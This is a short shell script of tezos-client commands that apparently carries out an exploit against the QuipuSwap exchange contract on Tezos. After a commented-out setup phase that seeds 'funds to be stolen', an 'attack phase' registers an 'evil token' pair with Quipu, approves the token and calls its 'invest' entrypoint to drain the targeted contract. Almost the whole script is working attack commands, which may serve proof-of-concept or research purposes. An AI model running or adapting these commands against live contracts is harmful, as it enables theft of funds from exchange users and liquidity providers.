#!/bin/sh

attacker=KT1Dq6g7vJjAS1CxRKfBGW7eK3DzrZh9f4r7
attacked=KT1VCczKAoRQJKco7NiSaB93PMkYCbL2z1K7
quipuswap=KT1BuxM5qtgw9zJ94nekJE7FMaCKBTxjPZrQ

### initial investment phase. Provide some funds to be stolen ###
# allow quipu to spend my account token_a

# tezos-client transfer 0 from tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw to KT1Pff2dWM4tTb7MPrA7uQgWevcKhuLsQkov --entrypoint 'update_operators' --arg '{ Left (Pair "tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw"  (Pair "KT1BuxM5qtgw9zJ94nekJE7FMaCKBTxjPZrQ" 0)) }' --burn-cap 0.1

# # allow quipu to spend my account token_b
# tezos-client transfer 0 from tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw to KT1VCczKAoRQJKco7NiSaB93PMkYCbL2z1K7 --entrypoint 'update_operators' --arg '{ Left (Pair "tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw"  (Pair "KT1BuxM5qtgw9zJ94nekJE7FMaCKBTxjPZrQ" 0)) }' --burn-cap 0.1

# # initialize good exchange
# tezos-client transfer 0 from tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw to KT1BuxM5qtgw9zJ94nekJE7FMaCKBTxjPZrQ --entrypoint 'initializeExchange' --arg 'Pair  (Pair  (Pair (Pair (Left (Right Unit)) "KT1BuxM5qtgw9zJ94nekJE7FMaCKBTxjPZrQ")  (Pair 0 "KT1VCczKAoRQJKco7NiSaB93PMkYCbL2z1K7"))  0)  (Pair 100 100)' --burn-cap 0.1



### attack phase ###

# deploy evil token pair to Quipu
tezos-client transfer 0 from tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw to KT1BuxM5qtgw9zJ94nekJE7FMaCKBTxjPZrQ --entrypoint 'initializeExchange' --arg 'Pair (Pair (Pair (Pair "KT1Dq6g7vJjAS1CxRKfBGW7eK3DzrZh9f4r7" 0) (Pair (Right Unit) "KT1VCczKAoRQJKco7NiSaB93PMkYCbL2z1K7")) (Pair 0 (Right Unit))) (Pair 200 200)' --burn-cap 0.2

# allow evil token to be spent on quipu
tezos-client transfer 0 from tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw to KT1Dq6g7vJjAS1CxRKfBGW7eK3DzrZh9f4r7 --entrypoint 'allow' --arg '"KT1VCczKAoRQJKco7NiSaB93PMkYCbL2z1K7"' --burn-cap 0.2

# attack!
tezos-client transfer 0 from tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw to KT1Dq6g7vJjAS1CxRKfBGW7eK3DzrZh9f4r7 --entrypoint 'invest' --arg 'Pair (Pair 95 95) (Pair 95 "KT1VCczKAoRQJKco7NiSaB93PMkYCbL2z1K7")' --burn-cap 0.2
